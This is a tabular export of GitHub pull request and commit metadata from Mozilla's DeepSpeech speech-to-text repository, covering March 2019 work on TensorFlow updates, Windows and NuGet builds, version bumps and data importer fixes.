2253,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1964,1964,Added missing import,,tilmankamp,5991088,2019-03-19T14:46:01Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,192dfcad8d4c70b347255ed7dcd4ca69d6b7dc57,Added missing import
2254,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1963,1963,Fix #1962,Fix for #1962. Also adds 0-length mp3 skipping to CommonVoice v1.x importer.,tilmankamp,5991088,2019-03-18T17:55:08Z,CONTRIBUTOR,True,36,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c6a4e08ca19d9eaa33298752cad29d46b99b06f,Fix #1962
2255,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1961,1961,Force tables 3.4.4 because 3.5.1 does not provide python wheel,,lissyx,1645737,2019-03-16T08:51:54Z,COLLABORATOR,True,0,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85533545f03e7d65005dcf04b0eb88a039e55ecf,Remove Python 3.4 from supported training platforms
2256,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1960,1960,Move NuGet builds to avoid triggered clean,"Can't replicate on my local setup, need to see the cluster result.

",carlfm01,32177100,2019-03-15T18:40:09Z,COLLABORATOR,True,7,7,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed37957865036e417efdcb189a6180c135f369e2,Move NuGet builds to avoid triggered clean
2257,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56df4ebf03fbe52c78fd5b510b2e74e4613e0a0c,"Add Input Rate to examples/mic_vad_streaming.
Add -r for input device sample rate and -d for device index by PyAudio"
2258,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dedf2911dacb0df6635e534b177240ebe5946390,Add resampling to microphone stream if different from processing sample rate. Uses scipy.signal
2259,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,715b8c52ec292c693aa6e397bb5a5f1aad65fb0c,short readme for data dir
2260,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77b2f8f3ecaa8178d1a1c6a18457f2d5351b8678,Address pull request feedback from @lissyx
2261,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75149f33df620ef40d5f642c550e3b6e22513d27,"Building on Windows

Fixes #1793
Fixes #1794"
2262,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,30287c5ded703b5815d47d5da4d12bb1a9d0acff,Update TensorFlow r1.12
2263,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,434a5776ae44c54bc66cdd9643adff34678453c4,"Merge pull request #1921 from lissyx/r1.12-win

Building on Windows"
2264,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1ad490b25c68592c4da28f6bd8c26269ab72cc97,"Add Windows NuGet upload

Fixes #1942"
2265,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3dc5f0e89a44f7666e6171069e82ed32fdab3f73,"Merge pull request #1949 from lissyx/nuget-upload

Add Windows NuGet upload"
2266,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9757531e482aa2adfd568d3ba5109e8048ed8df6,"Bump VERSION to 0.5.0-alpha.2

X-DeepSpeech: NOBUILD"
2267,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1adc8d4539b6f31a23cb72b5f52c61bd1038fd90,"Merge pull request #1950 from lissyx/bump-v0.5.0-alpha.2

Bump VERSION to 0.5.0-alpha.2

X-DeepSpeech: NOBUILD"
2268,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e237de2fc39774e1b54c37f45460f4091902314b,"Force rebuild

X-DeepSpeech: NOBUILD"
2269,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,16379efcd5c4a22d5444261e060b13a90ff5bc3b,"Merge pull request #1951 from lissyx/force-rebuild

Force rebuild"
2270,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7367d4b4075d6b374d5306c6dcd0b555d6cfe70,Make bin/run-ldc93s1.sh run faster
2271,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1a114c463b795dba07c856b23d5897ec56ec3763,"Merge pull request #1952 from mozilla/faster-ldc93s1.sh

Make bin/run-ldc93s1.sh run faster"
2272,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,238987a70f9a817cb4de72f15fa9f2487b90da50,Fix #1955
2273,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,35ebcd2075fc60fa9b783ab377b9f51092a29191,"Merge pull request #1956 from tilmankamp/fix1955

Fix #1955"
2274,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eb94aadb760681c994db059e3cbc4f8777fe6365,Add NET Framework targets
2275,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d63a838e09aa4eea1ef9b6cae9ab191e6fd1d7a8,"Merge pull request #1958 from carlfm01/net-targets

Add NET Framework targets"
2276,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e26f4c2a1d9ee978b7d1773ed7265d7bc7a17caf,Merge remote-tracking branch 'upstream/master' into update-tf-master
2277,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ed37957865036e417efdcb189a6180c135f369e2,Move NuGet builds to avoid triggered clean
2278,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,84101139bfc8199fef00dab73c4f3dd7da8c8905,"Merge pull request #1960 from carlfm01/net-targets

Move NuGet builds to avoid triggered clean"
2279,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,85533545f03e7d65005dcf04b0eb88a039e55ecf,Remove Python 3.4 from supported training platforms
2280,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ef5519c6fdd98df912196a43e089377b6976911b,"Merge pull request #1961 from lissyx/tables-3.4.4

Force tables 3.4.4 because 3.5.1 does not provide python wheel"
2281,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,481dd7d2c647ac1fcc0748787001e4da1936603a,"Merge pull request #1901 from jorxster/feature/examples_mic_vad_streaming_input_rate

Feature/resample examples mic vad streaming input rate"
2282,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dca3edb16700a8542e2cbbd33762213942b91c1c,Merge remote-tracking branch 'upstream/master' into update-tf-master
2283,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e8169160b6a05f9a5cec4540e5372d340fb290b8,Improved Nodejs streaming inference with VAD and FFmpeg
2284,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a718ecd864bb17b5cd9ef4c589cb8289cb27c74,"Merge pull request #1915 from igorfritzsch/master

Improved Nodejs streaming inference with VAD and FFmpeg"
2285,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,797ece5cce90c0f30891d2dc2e8b22b2066d3807,Merge remote-tracking branch 'upstream/master' into update-tf-master
2286,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1959,1959,Update tf master,,lissyx,1645737,2019-03-15T15:38:42Z,COLLABORATOR,True,1542,198,64,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c6a4e08ca19d9eaa33298752cad29d46b99b06f,Fix #1962
2287,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1958,1958,Add NET Framework targets,"Add .NET framework targets to the Nuget package, adding .NET Frameworks client for 4.5,4.6 and 4.7, not ready yet, maybe will include the fix for the .so not being moved to the target directory.",carlfm01,32177100,2019-03-15T04:06:02Z,COLLABORATOR,True,29,4,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eb94aadb760681c994db059e3cbc4f8777fe6365,Add NET Framework targets
2288,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1957,1957,Update to TensorFlow v1.13,,reuben,477142,2019-03-14T16:51:49Z,MEMBER,True,44,52,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,91fa181b7406fe5f0010348ef71d26b7000666c6,Update to TensorFlow 1.13
2289,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1957,1957,Update to TensorFlow v1.13,,reuben,477142,2019-03-14T16:51:49Z,MEMBER,True,44,52,24,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32d766f0e70323be2aa09fc0214c9500edf98bc2,Point TF artifact to merged r1.13 branch
2290,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1956,1956,Fix #1955,,tilmankamp,5991088,2019-03-14T11:26:11Z,CONTRIBUTOR,True,19,8,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,238987a70f9a817cb4de72f15fa9f2487b90da50,Fix #1955
2291,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1952,1952,Make bin/run-ldc93s1.sh run faster,"The main use of bin/run-ldc93s1.sh is to test our code, not any training aspect, so I propose we make it faster to speed-up edit-test cycles. With these changes I can run it in 5 seconds on my laptop CPU, which is pretty good.",reuben,477142,2019-03-13T13:20:25Z,MEMBER,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7367d4b4075d6b374d5306c6dcd0b555d6cfe70,Make bin/run-ldc93s1.sh run faster
2292,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1951,1951,Force rebuild,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-03-13T12:44:52Z,COLLABORATOR,True,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e237de2fc39774e1b54c37f45460f4091902314b,"Force rebuild

X-DeepSpeech: NOBUILD"
2293,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1950,1950,Bump VERSION to 0.5.0-alpha.2,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-03-13T12:23:15Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9757531e482aa2adfd568d3ba5109e8048ed8df6,"Bump VERSION to 0.5.0-alpha.2

X-DeepSpeech: NOBUILD"
2294,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1949,1949,Add Windows NuGet upload,,lissyx,1645737,2019-03-13T08:08:22Z,COLLABORATOR,True,39,0,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1ad490b25c68592c4da28f6bd8c26269ab72cc97,"Add Windows NuGet upload

Fixes #1942"
2295,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1945,1945,Text Search(Extraction),"Embedding Extraction
Extraction Scripts",ujwalbvs,43912149,2019-03-12T16:54:44Z,NONE,False,524,19,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39e57ce68dc157c40863ec1603d799db4c5456e6,Added initial embedding dumping code
2296,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1945,1945,Text Search(Extraction),"Embedding Extraction
Extraction Scripts",ujwalbvs,43912149,2019-03-12T16:54:44Z,NONE,False,524,19,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,27a527c649e1c5968c79b28a1c4b1a77be532d15,Merge Conflict
2297,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1945,1945,Text Search(Extraction),"Embedding Extraction
Extraction Scripts",ujwalbvs,43912149,2019-03-12T16:54:44Z,NONE,False,524,19,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5f2b4a12319d20860925378273933253b0aea1bc,Added scripts for creating corpora and test data
2298,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1945,1945,Text Search(Extraction),"Embedding Extraction
Extraction Scripts",ujwalbvs,43912149,2019-03-12T16:54:44Z,NONE,False,524,19,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af0f78f4df38a40f876348b82fd1617c706b20f7,"Merge pull request #1 from soumym/dev/smondal

Added scripts for creating corpora and test data"
2299,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1945,1945,Text Search(Extraction),"Embedding Extraction
Extraction Scripts",ujwalbvs,43912149,2019-03-12T16:54:44Z,NONE,False,524,19,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c04d15d7ec7c11d343db271eb697448133858828,Middle Layers Embedding Extraction
2300,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1945,1945,Text Search(Extraction),"Embedding Extraction
Extraction Scripts",ujwalbvs,43912149,2019-03-12T16:54:44Z,NONE,False,524,19,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,228a24a4299efd55bef8d89187c97a67405381d6,Merged Master
2301,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1945,1945,Text Search(Extraction),"Embedding Extraction
Extraction Scripts",ujwalbvs,43912149,2019-03-12T16:54:44Z,NONE,False,524,19,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,092d2e1209573e21a4a8d729fd2f77ce7e07fa8b,Extraction Scripts and writing output embeddings
2302,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1939,1939,Use tf.lite.TFLiteConverter to create tflite model,,reuben,477142,2019-03-09T15:02:47Z,MEMBER,True,12,36,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d3aa5020a66ede7de22b30732f0515fde630cae6,Use tf.lite.TFLiteConverter to create tflite model
2303,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77a9a53634cf87b27d2ae25a06016abe41d94430,Define native_client asset upload name
2304,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,060b17bfef9f3491e5464045eb8266bb9325ecaf,"Handle GitHub upload of Android builds

X-DeepSpeech: NOBUILD"
2305,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,424d583fb24b762d5415b970fa3140203e14da18,"Merge pull request #1787 from lissyx/android-upload

Android upload"
2306,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a3cba069ff4f9fcb7cce350d75af318067c0603,"Bump VERSION to 0.4.0-alpha.2

X-DeepSpeech: NOBUILD"
2307,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,121fdc84cd7a6eeb627d4fb6ad35fdfa9cb129c7,"Merge pull request #1788 from lissyx/bump-v0.4.0-alpha.2

Bump VERSION to 0.4.0-alpha.2"
2308,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,936504f7e095f8f78d66f2646320882edeb9ba88,"Move nc_asset_name to extra

X-DeepSpeech: NOBUILD"
2309,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d3168391b3e9ee041bf8c517237cbacbd0c23da2,"Merge pull request #1789 from lissyx/fix-nc-asset-name

Move nc_asset_name to extra"
2310,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b6ca78c39eda7840cfb39bafc549c9644da7be9,Use final version of TensorFlow r1.12
2311,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc943c366b0bb1795585a19a673cdecdd79fa5c1,"Merge pull request #1790 from lissyx/update-tf-1.12

Use final version of TensorFlow r1.12"
2312,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bca54d3f03a502ff7e6b67ed9a5a6aeab2d2bea8,Add OpenFST 1.6.9 Windows + README.mozilla
2313,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7efb8c7a56c41130a3b5a290b8f4c5ad560ef82,Add cmath for Windows
2314,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1dc6cc490cc90f3e0876f45452e8b406965c9ad4,Add file access defines Windows
2315,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33f5b640e44986356662c74afb1abadc6ded62fe,Add CSharp client + examples
2316,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89cc31f9cec054e40f5ff7f9796e54f413290630,Add OpenFST selects Windows
2317,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,714673ed30e6447e38faa9fca36921fc9dea82d9,Export client definitions .NET
2318,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd6938f7af41cce64492bc61f140635646766654,Fix handling of Alphabet around evaluate.py
2319,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17517cb453b090b8d129846d071824e0facd2e61,Add math defines Windows
2320,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe2963158d29bfe250cf63128c022c8883653951,Merge branch 'master' into master
2321,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c4d2bcdfb0f2c42d6a0837736ae08841f5f1909f,"Merge pull request #1758 from carlfm01/master

Support for Windows"
2322,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1936,1936,Update tf-master,,reuben,477142,2019-03-09T00:15:56Z,MEMBER,True,212119,546,676,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24361c6a0d79087ef0172b12f5b655425f228cae,Bump VERSION to 0.4.0-alpha.3
